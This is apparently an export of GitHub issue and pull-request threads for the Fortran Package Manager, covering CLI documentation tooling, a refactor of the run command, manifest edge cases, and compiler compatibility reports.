                    "user": "scivision",
                    "date": "2020-11-22 02:23:11+00:00",
                    "text": "I took a try at this. To make fpm build purely from CMake, I would need to add FetchContent (CMake feature) to retrieve and build toml-f and M_CLI2. The goal of this is to partially address #123 by making fpm build from nothing more than CMake and Fortran compiler, without needing bootstrap fpm. Would this be useful?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-22 08:07:26+00:00",
                    "text": "@scivision I'm sometimes building fpm with meson myself. So I'm certainly not against adding another build system (cmake/meson/...) to this repository as it makes some tasks way easier.\nFrom #123 I suspect that a fpm dist --cmake command was intended for this purpose to generate a source distribution with additional CMake files. Until we are actually able to do this, another build system might be a suitable choice as well.\nFetchContent seems to be the easiest way to get the dependencies with CMake, I'm using something similar right now for toml-f."
                }
            ]
        },
        {
            "number": 230,
            "user": "awvwgk",
            "date": "2020-11-07 12:50:19+00:00",
            "title": "Create a specification of the fpm command line interface (asciidoctor)",
            "text": "Create fpm(1) and the currently available six subcommand manual pages.\nTo check the resulting manual pages on the command line translate them with asciidoctor:\nasciidoctor -b manpage fpm.adoc\nman -l fpm.1\n\n\nI guess asciidoc is not that well known by everybody, checkout its homepage and the asciidoctor project for a short overview. It is comparable to reStructuredText as an extendable and standardized markup language for technical writing. There are several large projects using it extensively but it is not as well known as Markdown.\n\nPlease review this PR while comparing to #261 and consider the following points\n\nsetup/usage of the toolchain\nthe markup language to express the command line documentation\nthe output (both HTML and roff/man page)\nthe preview on GH\n\nCloses #227\nCloses #261",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 18:01:31+00:00",
                    "text": "I have looked for alternatives to write man pages and CLI documentation, but asciidoc seems to be the best solution I could fine so far, therefore I will just open this PR for discussion."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-30 19:13:40+00:00",
                    "text": "Have you tried converting Markdown to man page format using Pandoc? There's an example here.\nI ask because 1) Markdown is simpler than Asciidoc and we're already writing Markdown for READMEs, and 2) pandoc is a more mature tool than asciidoctor (I think)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 19:19:06+00:00",
                    "text": "Thanks for the suggestion, I will give it a try and open another PR with markdown files if it works out nicely. Than we can compare and make a choice between the two."
                }
            ]
        },
        {
            "number": 229,
            "user": "LKedward",
            "date": "2020-11-06 11:37:32+00:00",
            "title": "Refactor run command",
            "text": "This PR simplifies the run command implementation to use information provided by the model%targets structure. This avoids the duplication of code which has caused the run command to construct executable paths differently to the build command; this PR fixes this problem.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 01:05:03+00:00",
                    "text": "So far the code looks good and is passing many tests but ran into\na few problems that might be on my side, and I have not gotten\nthrough some more complex builds with C code so I am still testing.\nI am excited on how well it it working on a machine with no bootstrap\nversion installed, just the Fortran version. Basic build, run, and\ntest are working with many fpm(1) packages I have with --release and\n--list.\nI like the change to just show the pathname with --list which I was\ngoing to put a little PR in for. It allows the names to be used with\nexternal filters easily. It works particularly well with the Unix\nxargs(1) command.\nOn a machine with just a single Fortran source built from #pr229\nmany fpm(1) packages are working. The ones that I do not think I\ncan build with this version are ones that require a \"fpm.mk\" or custom\nbuild script.\nSo this is the only issue I have to raise at this point ...\nWhen an executable does not exist there is no message.\n   ffpm new A --lib\n   cd A\n   ffpm run\n   ffpm test\nThis is different than the h-fpm version, which produces a warning\nmessage. It is arguable whether it should or should not produce a\nmessage for the case where there is no executable but even when the name\nis incorrect no error or warning is produced. eg:\n   ffpm run this_is_a_typo\ndoes not warn that there is no such executable. I think it should produce\na message and perhaps do the equivalent of the --list option to show the\navailable choices. Maybe just the basenames would be preferable in a\nlittle table.\n box_month       d2j              d2o              d2u            d2w\n date_to_julian  date_to_unix     days2sec         dow            easter\n fmtdate         fmtdate_usage    guessdate        j2d            julian_to_date\n mo2d            mo2v             moon_fullness    M_time_oop     now\n o2d             ordinal_seconds  ordinal_to_date  phase_of_moon  sec2days\n system_sleep    u2d              unix_to_date     v2mo           w2d\n runTests        \n\nmaybe just a message to say to use the --list option to see available choices when an unknown name is entered?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 17:23:46+00:00",
                    "text": "A minor inconsistency. The default search includes the current directory\nwhen anything is found, but if you have no app/ directory it tells you there is nothing to build.\nBut if you explicitly tell it to build a program in the current directory\nyou end up getting two executables if you do not use the default name\nfor your executable.\nI like the concept of having a project in a directory with\nnothing but a source file and an fpm.toml file with external dependencies.\nAnd if I add the auto-executables directive I get the intuitive result.\nSo if I have a directory that contains nothing but \"main.f90\" and the\nfollowing manifest file I get the binary that I was trying to produce (so I\nconsider this the \"minimal project\"). I can see use cases for this where\nI have a program that needs nothing else except external directories.\nCASE I\nname = \"test\"\n[build]\nauto-executables = false\n\n[[executable]]\nname=\"testit\"\nsource-dir=\".\"\nmain=\"main.f90\"\nbut if I just have a manifest with a name in it and the same program file\nCASE II\nname = \"test\"\nI get\nNeither library nor executable found, there is nothing to do\nERROR STOP 1\n\nError termination. Backtrace:\n   :\n   :\n\nSo it acts like the current directory is not automatically searched.\nBut if I change the manifest to\nCASE III\nname = \"test\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\".\"\nmain=\"main.f90\"\nIt builds two executables, main and testit because the code\nautomatically searches the current directory. So to have the minimal\ntwo-file project just generate a single file I have to turn off\nauto-detection.\nThe documentation for the manifest file says it searches in the\ndefault directories, so one suggestion might be that it not search\nthe current directory.\nAnother approach would be to have it find and build without the\nerror message when it finds a program in the current directory instead\nof saying there are not any.\nI think others might argue it should only allow pathnames below the\ncurrent directory but I actually like being able to make a two-file\nproject where the manifest just lists external dependencies. I think\nthis could be a common use of fpm."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-07 17:35:58+00:00",
                    "text": "@urbanjost, I like the idea of a minimal two file project - it was not a test case I thought of testing before. It looks like there's a bug in the source processing of explicit [[executable]] entries; the current/root directory should not be searched by auto-discovery. Both Case I and case III should work, but not case II. I will look into this. Thanks for bringing it up."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 19:14:27+00:00",
                    "text": "That was fast. Perfect for ffpm run **not_there** when there are valid targets. When there are no valid targets a simple ffpm run produces no message, but for consistency should it say \"no valid targets\" or show the same thing that \"ffpm run empty\" did in the directory with no targets in the following sequence of commands? I am fine with it as-is but I think it would be less confusing if you were working with a package you did not create and/or were new to fpm. Really nice work. Least number of comments I think I have ever had for something with so many arbitrary paths through it in an alpha version; and nothing I spotted by eye in the code to comment on at all.\n#!/bin/bash\n(\nexec 2>&1\n set -x\n ffpm run asdf\n ffpm new A -lib\n cd A\n ffpm run     <<<< NO OUTPUT?\n ffpm run empty\n)|tee -a $0\nexit\n################################################################################\n+ ffpm run asdf\nfpm::run<ERROR> specified names \"asdf\" not found.\n\n Available names:\n        box_month              d2j              d2o              d2u\n              d2w   date_to_julian     date_to_unix         days2sec\n              dow           easter          fmtdate    fmtdate_usage\n        guessdate              j2d   julian_to_date             mo2d\n             mo2v    moon_fullness       M_time_oop              now\n              o2d  ordinal_seconds  ordinal_to_date    phase_of_moon\n         sec2days     system_sleep              u2d     unix_to_date\n             v2mo              w2d\nSTOP 1\n+ ffpm new A -lib\n + mkdir -p A\n + cd A\n + mkdir -p A/src\n + git init A\nInitialized empty Git repository in /home/urbanjs/venus/V600/github/M_time/A/.git/\n+ cd A\n+ ffpm run\n+ ffpm run empty\nfpm::run<ERROR> specified names \"empty\" not found.\n\n Available names:\n\nSTOP 1"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 20:35:26+00:00",
                    "text": "This is an edge case but it looks like it would only take a few lines to warn the user something went wrong.\nSince all the applications go into one directory it is relatively easy to create duplicates that collide. So with a manifest\nlike this\nname = \"test\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\".\"\nmain=\"main.f90\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\"other\"\nmain=\"main.f90\"\n\n[[executable]]\nname=\"testit\"\nsource-dir=\"other\"\nmain=\"main2.f90\"\nIn a intentionally setup with intentional duplicates both h-fpm and\nf-fpm build all the targets. h-fpm places them in subdirectories\ncorresponding to their original location while f-fpm places them all\nin build/*/app/. h-fpm has no good way to execute them except by the\nbasename that I know of so all the targets exist but it is not without\nissues, but f-fpm overwrites. f-fpm does list them all with\nfpm build --list\nso I think it would be relatively easy to warn when there are duplicate\nbasenames so you know there was an overwrite.\nIn my testcase the filesystem looks like\n./app/main.f90\n./app/main2.f90\n./other/main2.f90\n./other/main.f90\n./other/main3.f90\n\nI agree this an aberrant case but it looks like the warning would be easy\nto produce.\nI much bigger change would be to put the executables into separate directories like h-fpm but unless the run command took subdirectory names that really does not solve the issue; and if the user is warned they can easily (probably) resolve it by giving a unique name to the output executable in the manifest  file."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 23:18:50+00:00",
                    "text": "When I took a second look there is a fixed format of 17 characters, which I sometimes\nexceed.\nAvailable names:\ndemo_system_accesdemo_system_chdirdemo_system_chmoddemo_system_chown                                                               \ndemo_system_cleardemo_system_closedemo_system_cpu_tdemo_system_errno                                                               \ndemo_system_getcwdemo_system_getegdemo_system_getendemo_system_geteu                                                               \ndemo_system_getgidemo_system_getgrdemo_system_gethodemo_system_getlo                                                               \ndemo_system_getpidemo_system_getppdemo_system_getpwdemo_system_getsi                                                               \ndemo_system_getuidemo_system_getumdemo_system_initedemo_system_isblk                                                               \ndemo_system_ischrdemo_system_isdirdemo_system_isfifdemo_system_islnk                                                               \ndemo_system_isregdemo_system_issoc demo_system_kill demo_system_link                                                               \ndemo_system_mkdirdemo_system_mkfifdemo_system_opend demo_system_perm                                                               \ndemo_system_perrodemo_system_puten demo_system_randdemo_system_readd                                                               \ndemo_system_readedemo_system_realpdemo_system_removdemo_system_renam                                                               \ndemo_system_rewindemo_system_rmdirdemo_system_setsidemo_system_setum                                                               \ndemo_system_sranddemo_system_unamedemo_system_unlindemo_system_unset                                                               \ndemo_system_utime\nSTOP 1diff --git a/fpm/src/fpm.f90 b/fpm/src/fpm.f90I did ask for this :>. \n\nI cleaner way would require two passes to find the longest string I think. Maybe there is a simpler way you see. A kludge that\nmakes sure nothing is truncated without taking a second pass worked. It would not keep columns aligned but it would prevent truncattion:\nindex 31927fc..d852cb6 100644\n--- a/fpm/src/fpm.f90\n+++ b/fpm/src/fpm.f90\n@@ -304,7 +304,7 @@ subroutine cmd_run(settings,test)\n     class(fpm_run_settings), intent(in) :: settings\n     logical, intent(in) :: test\n \n-    integer :: i, j\n+    integer :: i, j, column_width\n     logical :: found(size(settings%name))\n     type(error_t), allocatable :: error\n     type(package_t) :: package\n@@ -382,8 +382,8 @@ subroutine cmd_run(settings,test)\n \n         j = 1\n         write(stderr,*) 'Available names:'\n+        column_width=17\n         do i=1,size(model%targets)\n-\n             exe_target => model%targets(i)%ptr\n     \n             if (exe_target%target_type == FPM_TARGET_EXECUTABLE .and. &\n@@ -394,7 +394,9 @@ subroutine cmd_run(settings,test)\n                 if (exe_source%unit_scope == &\n                     merge(FPM_SCOPE_TEST,FPM_SCOPE_APP,test)) then \n \n-                    write(stderr,'(A17)',advance=(merge(\"yes\",\"no \",modulo(j,4)==0))) basename(exe_target%output_file)\n+                    column_width=max(column_width,len(basename(exe_target%output_file))+1)\n+                    write(stderr,'(A)',advance=(merge(\"yes\",\"no \",modulo(j,4)==0))) &\n+                    & [character(len=column_width) ::basename(exe_target%output_file)]\n \n                     j = j + 1\nfpm::run<ERROR> specified names \"asdf\" not found.\n\n Available names:\ndemo_system_access demo_system_chdir  demo_system_chmod  demo_system_chown  \ndemo_system_clearenv demo_system_closedir demo_system_cpu_time demo_system_errno    \ndemo_system_getcwd   demo_system_getegid  demo_system_getenv   demo_system_geteuid  \ndemo_system_getgid   demo_system_getgrgid demo_system_gethostname demo_system_getlogin    \ndemo_system_getpid      demo_system_getppid     demo_system_getpwuid    demo_system_getsid      \ndemo_system_getuid      demo_system_getumask    demo_system_initenv     demo_system_isblk       \ndemo_system_ischr       demo_system_isdir       demo_system_isfifo      demo_system_islnk       \ndemo_system_isreg       demo_system_issock      demo_system_kill        demo_system_link        \ndemo_system_mkdir       demo_system_mkfifo      demo_system_opendir     demo_system_perm        \ndemo_system_perror      demo_system_putenv      demo_system_rand        demo_system_readdir     \ndemo_system_readenv     demo_system_realpath    demo_system_remove      demo_system_rename      \ndemo_system_rewinddir   demo_system_rmdir       demo_system_setsid      demo_system_setumask    \ndemo_system_srand       demo_system_uname       demo_system_unlink      demo_system_unsetenv    \ndemo_system_utime       \nSTOP 1\n\nI was looking for a quick way to find the longest name and did not see it off the bat and thought I would show you this first before looking deeper. Maybe just listing the basenames instead of the table is simpler. I do not know how common having this many applications or tests is. I happen to try to have a demo as part of each manpage; which can add up quickly."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 23:32:08+00:00",
                    "text": "FYI: worked very nicely with a module of mine called M_system that contained a C file that required me to use an fpm..mk file with h-fpm. Refactoring all my fpm packages to work with f-fpm; which is breaking some of them for use with h-fpm. I am putting a note in the README.md files on the github sites to that effect, but a number of them are listed in the fpm registry which causes some confusion. I think I need to add a rev to the FPM registry files to point to the older ones"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-08 22:16:47+00:00",
                    "text": "All the other tests I have passed other than what I commented on.  I am moving a few repositories to use the new fpm but unless I stumble on something all my tests are complete. Seems like a bootstrappable single Fortran file would be due for people to experiment with?  They would just need a Fortran compiler and gfortran. build, run, test, new, help all function, the TOML interface and build with a remote dependency works,  the auto-discovery makes for some simple manifest files. Some people might be able to give feedback more readily if they just have to pull  a file down and compile it with the language they are developing in.  Still cannot do custom build scripts, add external libraries, options of OpenMP, OpenACC, MPI, Coarrays, ... but getting pretty useful."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-11 02:04:58+00:00",
                    "text": "A build of this branch placed into a single file and built with a simple \"gfortran ffpm.f90\" on a machine with git and gfortran but no bootstrap version built and ran all the repositories in the fpm registry except one that got a compiler error (it was gfortran 10.0) that was part of the package and not an fpm issue. I could build run and test (and help and new which were not really being changed) in all those packages.\nThe only problem I had was on a CygWin machine where I had to unset the OS environment variable in order for the code to select OS_TYPE=cygwin instead of MSWindows. I think that is a seperate issue to resolve in a new PR.\nOut of my own fpm packages the only one I cannot build is one that requires the X11 Windows libraries, which was expected as custom build scripts are not supported yet, nor are user-supplied load and compiler switches. Nice job."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-11 02:19:14+00:00",
                    "text": "PS:\nwget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90 \ngfortran ffpm.f90 -o ffpm\nI am going to leave the file ffpm.f90 available for a week that can be accessed via a browser or something like the wget(1) above.  If anyone has access to compilers other than gfortran I am very curious if the file compiles and runs. The fiile is fpm #229."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-11 08:58:28+00:00",
                    "text": "I have used Intel Fortran version 2018 to compile the file. It produced\nquite a few error messages - see the attachment.\n\nTwo of the error messages were easily corrected - stop abs(sig) is not\nallowed - stop comes with a constant only - and the message about\nallocating a zero-length string disappears when you change the asterisk to\na colon. However, the messages about get_value are more demanding. I have\nnot looked at them in any detail :)\n\nOp wo 11 nov. 2020 om 03:19 schreef urbanjost <notifications@github.com>:\n PS:\n\n wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n gfortran ffpm.f90 -o ffpm\n\n I am going to leave the file ffpm.f90 available for a week that can be\n accessed via a browser or something like the *wget(1)* above. If anyone\n has access to compilers other than gfortran I am very curious if the file\n compiles and runs. The fiile is fpm #229\n <#229>.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#229 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6OYXSQ2NVJTMFNGY3SPHYDBANCNFSM4TMSJTHQ>\n .\n\nIntel(R) Visual Fortran Intel(R) 64 Compiler for applications running on Intel(R) 64, Version 18.0.5.274 Build 20180823\nCopyright (C) 1985-2018 Intel Corporation.  All rights reserved.\n\nffpm.f90(1836): error #8231: In an ALLOCATE statement the type parameter values in type specification shall be an asterisk if and only if each object being allocated is a dummy argument for which the type parameter is assumed.   [STRINGS]\n         allocate(character(len=0)::strings(0))\n------------------------------------^\nffpm.f90(1841): error #8231: In an ALLOCATE statement the type parameter values in type specification shall be an asterisk if and only if each object being allocated is a dummy argument for which the type parameter is assumed.   [STRINGS]\n      allocate(character(len=0)::strings(0))\n---------------------------------^\nffpm.f90(2659): remark #8291: Recommended relationship between field width 'W' and the number of fractional digits 'D' in this edit descriptor is 'W>=D+7'.\n         read(nan_string,'(g3.3)')valu\n----------------------------^\nffpm.f90(5230): error #6345: Either a PAUSE, STOP or ERROR STOP statement has an invalid argument.   [ABS]\n      stop abs(sig)\n-----------^\nffpm.f90(6756): warning #6843: A dummy argument with an explicit INTENT(OUT) declaration is not given an explicit value.   [SELF]\nsubroutine new_keyval(self)\n----------------------^\nffpm.f90(10108): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10146): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10184): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10222): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10260): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10298): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10336): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10374): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, present(default), stat)\n--------^\nffpm.f90(10409): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10439): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10469): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10499): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10529): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10559): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10589): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10619): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(table, key, ptr, .true., stat)\n--------^\nffpm.f90(10946): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(10974): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11002): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11030): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11058): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11086): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11114): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11142): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11170): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11174): error #6285: There is no matching specific subroutine for this generic subroutine call.   [ADD_KEYVAL]\n         call add_keyval(array, ptr, stat)\n--------------^\nffpm.f90(11204): error #6285: There is no matching specific subroutine for this generic subroutine call.   [GET_VALUE]\n   call get_value(array, pos, ptr, stat)\n--------^\nffpm.f90(11446): catastrophic error: Too many errors, exiting\ncompilation aborted for ffpm.f90 (code 1)"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-11 13:43:05+00:00",
                    "text": "Thanks. That is basically all one issue I believe.  Interesting differences."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-11 13:49:38+00:00",
                    "text": "I have used Intel Fortran version 2018 to compile the file. It produced\nquite a few error messages - see the attachment.\n\n@arjenmarkus I'm responsible for parts of those issues with TOML-Fortran (get_value, see toml-f/toml-f#16), but those are now fixed with the v0.2.1 release and will be used in fpm with #233."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-11 19:24:16+00:00",
                    "text": "I'm responsible for parts of those issues with TOML-Fortran (get_value, see toml-f/toml-f#16), but those are now fixed with the v0.2.1 release and will be used in fpm with #233.\n\n@LKedward @awvwgk Considering this, is there a preferred order to merging? Should this PR wait for #233 or it doesn't matter?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-11 21:02:11+00:00",
                    "text": "Doesn't matter too much. In case there is a fix required in this PR as well, updating the TOML-Fortran dependency is just a simple patch version bump:\ndiff --git a/fpm/fpm.toml b/fpm/fpm.toml\nindex fc3a381..404e65c 100644\n--- a/fpm/fpm.toml\n+++ b/fpm/fpm.toml\n@@ -8,7 +8,7 @@ copyright = \"2020 fpm contributors\"\n [dependencies]\n [dependencies.toml-f]\n git = \"https://github.com/toml-f/toml-f\"\n-tag = \"v0.2\"\n+tag = \"v0.2.1\"\n \n [dependencies.M_CLI2]\n git = \"https://github.com/urbanjost/M_CLI2.git\""
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-12 08:52:32+00:00",
                    "text": "The fix isn't required for this PR and I have no preferred order of merging."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-12 19:05:32+00:00",
                    "text": "Sounds good, I will merge this."
                }
            ]
        },
        {
            "number": 228,
            "user": "LKedward",
            "date": "2020-11-06 08:37:35+00:00",
            "title": "Implement [test.dependencies] and [executable.dependencies]",
            "text": "Support for this manifest syntax was left out of #193.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-12 10:53:17+00:00",
                    "text": "Fixed by #266"
                }
            ]
        },
        {
            "number": 227,
            "user": "awvwgk",
            "date": "2020-11-04 21:17:16+00:00",
            "title": "Create a specification for the command line interface",
            "text": "To make clear what we expect from the command line interface we should create a specification of the current command line interface, similar to the specification for the manifest format. First, it allows to check for consistency for between the bootstrap and the Fortran version and gives a clear reference what to expect from an fpm implementation (of whatever kind). Also, it allows to propose new functionality independently of an implementation.\nGood material might be the dub or cargo reference\n\nhttps://dub.pm/commandline\nhttps://doc.rust-lang.org/cargo/commands/index.html\n\nThe format should probably be man page compatible, preferably markdown, such that we can include it on the online documentation with various tools (FORD, jekyll, ...) and also translate it to roff. I personally prefer asciidoc to write man pages, which is translatable to roff and compatible with jekyll but probably not with FORD.\nAny other opinion or suggestions on this?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-05 09:37:13+00:00",
                    "text": "Yes this is definitely needed; we have two slightly divergent CLIs currently. I don't have experience with asciidoc, but I agree that it would be good to have man page compatibility for this. I don't see FORD compatibility as a necessity for this."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 01:53:48+00:00",
                    "text": "I use txt2man(1) markup myself so I have not tried asciidoc although I have heard about it. In my own environment the manpage document is written as text blocks in the Fortran source file and extracted and usuallly also converted to comments or a text variable declaration by a preprocessor which works the way I like (documentation, Fortran source all in one file and automatically converted to roff and then (via man2html or groff) converted to HTML) but I don't expect the rest of the world to do that.\nThat being said, txt2man is widely available, simple, and works reasonably well for basic manpages. I keep meaning to make a Fortran program that is the equivalent but do not.\nThis is particularly apt as I was just going to open an issue and ask if we wanted to add a CLI option to specify custom compiler options like h-fpm recently added; but was thinking the syntax `fpm build -- -arg1 opt1 -arg2 -arg3... would be the easiest to implement and be a little easier to use but would be a different syntax for f-fpm than h-fpm. Wanted feedback on how people felt about it at all and what experiences everyone was having with the h-fpm version but the topics overlap; and at a minimum highlight the question of whether h-fpm and f-fpm need to stay in sync or not."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 03:15:28+00:00",
                    "text": "Note that fpm help manual writes out a file that was essentially written in txt2man markdown. Each help section was designed to be converted to roff via txt2man(1). The roff can then be converted to html, which can display on a github page if you turn on the doc section, or github markup allows you to put HTML into a md file by putting <? above the HTML; although a little tweaking was involved. I had put that file in the fpm repository for easier review of the documentation at one point.\nIt needs a little tweaking, but\nmozilla.pdf"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-09 08:58:19+00:00",
                    "text": "@urbanjost Thanks for mentioning txt2man. This would be an alternative to consider. I mainly opened this issue to discuss and agree on tools for this purpose. I'm also happy to try something other than asciidoc for this purpose as well.\nI wonder if txt2man is actually a cross-platform tool or if it is limited to Unix systems since it is written in bash/gawk (using GNU extensions)? I used txt2man a bit after you brought it up with the intrinsics module, the one thing I noticed is that it can become quite slow when converting several text files.\nI want to decouple the Fortran or Haskell implementation from the specification on purpose. I think it makes more sense to document the wanted behaviour and than to provide the matching implementation. I would take the Fortran version as ground of truth for now.\n\nWanted feedback on how people felt about it at all and what experiences everyone was having with the h-fpm version but the topics overlap; and at a minimum highlight the question of whether h-fpm and f-fpm need to stay in sync or not.\n\nI would very much like them to stay in sync, having a common documentation and force to document any deviating behaviour might help with this.\n\nThis is particularly apt as I was just going to open an issue and ask if we wanted to add a CLI option to specify custom compiler options like h-fpm recently added; but was thinking the syntax `fpm build -- -arg1 opt1 -arg2 -arg3... would be the easiest to implement\n\nPlease go ahead and open a new issue, I have a few suggestions for this."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 22:25:56+00:00",
                    "text": "I created #261 using markdown to write the man page and convert it using pandoc. There is also #230 using asciidoc as markup language and using asciidoctor to convert to roff and HTML. If there is interest I can create another PR with txt2man.\nI would suggest that we review the PRs under consideration of:\n\nsetup/usage of the toolchain\nthe markup language to express the command line documentation\nthe output (both HTML and roff/man page)\nthe preview on GH\n\nAny other point we should look out for?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-06 01:07:13+00:00",
                    "text": "I had something in mind that at some point we would have as part of a package a doc directory and that the install command could look at the suffix of the files and place at least common formats in an \"installed\" location.  Not really familiar with some of the other tools mentioned but I am assuming the processing would be done by the fpm developers to a few formats so users would not have to install a lot of software just to read the document.  At a minimum I want the help text of the program to be relatively complete and to contain links to WWW resources as appropriate, and for a manual to be availble in a PDF format. I am not quite sure if you are talking about documentation distributed as part of fpm for users or developer documentation or both?\nThe help text was written specifically with it in mind that it could be converted to manpages and HTML and a PDF easilly, so I picked txt2man(1) because it is formatted completely with flat text and whitespace. So the direction is 'fpm help TOPIC|txt2man >TOPIC.1fpm or >fpm-TOPIC.1.  It seems like this would require the opposite process where the documents are maintained external to the program.  MSWindows (except in CygWin).  With fpm changing rapidly the potential for a mismatch between documentation and the version being used at this point seems high unless the documentation is in the code or distributed with each release. For now the simplest solution seemed to be to make sure at least basic documentation is built in.  Do other packages use a second application when help is called, or do they contain basic documentation built in?  The basic functionality I was modeling was largely based on cargo (and that is similar to what I normally do, so I am perhaps biased). Should all documentation or almost all go to a compantion program perhaps called fpm-help?  What do you see a new user having to do to access documentation? There not being any universal format for this I have pondered exactly what we can do so if you have a lot of dependencies in a program that you have documentation for the packages; ideally even on a platform not connected to a network or where users cannot install additional packages easily."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-06 14:13:59+00:00",
                    "text": "You give me quite a lot to think about. I will try to comment on the first part for now and come back later for the remainder.\nIn reverse order.\n\nI am not quite sure if you are talking about documentation distributed as part of fpm for users or developer documentation or both?\n\nI was thinking about user documentation which we can distribute with fpm once we have a fully functional fpm-install command.\n\nAt a minimum I want the help text of the program to be relatively complete and to contain links to WWW resources as appropriate, and for a manual to be availble in a PDF format.\n\nI agree. HTML and PDF is as far as I know something all three so far suggested tools can easily provide.\n\nNot really familiar with some of the other tools mentioned but I am assuming the processing would be done by the fpm developers to a few formats so users would not have to install a lot of software just to read the document.\n\nYes this is one of my main concern, whatever we choose should be immediately accessible by the user. The lowest barrier for interacting with the fpm documentation is currently visiting this repository via the GitHub web interface, therefore I think it is a great plus point if our approach allows a decent preview in the web interface by itself. Also important is how well the documentation works from the cloned git repository in a plain text editor, like nvim or emacs, or in an IDE, which might also provide a preview for certain formats. Also here if the format is reasonable readable without processing I consider this a great plus.\nThis becomes less of an issue once we have a dedicated place to display fpm specific documentation at https://fortran-lang.org or someplace else, because here we can easily show the processed output.\n\nI had something in mind that at some point we would have as part of a package a doc directory and that the install command could look at the suffix of the files and place at least common formats in an \"installed\" location.\n\nThis is definitely something I want to look into once we have included the fpm-install command. One possibility would be to extend the proposed [install] table with documentation or have a separate 